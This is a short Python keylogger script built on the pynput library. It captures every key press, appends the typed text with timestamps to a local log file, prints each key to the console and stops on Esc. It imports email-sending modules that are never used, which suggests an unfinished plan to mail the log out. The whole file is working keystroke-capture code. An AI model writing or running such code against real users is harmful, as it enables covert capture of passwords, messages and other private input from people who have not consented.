import datetime
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from pynput import keyboard

# key logging variables including file path to log file
log_file = "key_presses.txt"
keys_pressed = "" 

# Records key presses
def on_press(key):
    global keys_pressed
    try:
        keys_pressed += key.char  # regular key
        print(f"Key {key.char} pressed")
    except AttributeError:
        keys_pressed += f"[{key}]"  # special key
        print(f"Special key {key} pressed")

# Records released keys
def on_release(key):
    global keys_pressed
    
    # Only write if something was typed
    if keys_pressed:
        with open(log_file, "a") as f:
            f.write(f"{keys_pressed} at {datetime.datetime.now()}\n")
        keys_pressed = ""  # reset after writing
    
    if key == keyboard.Key.esc:
        print("Exiting keylogger...")
        return False

# Keyboard listener
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()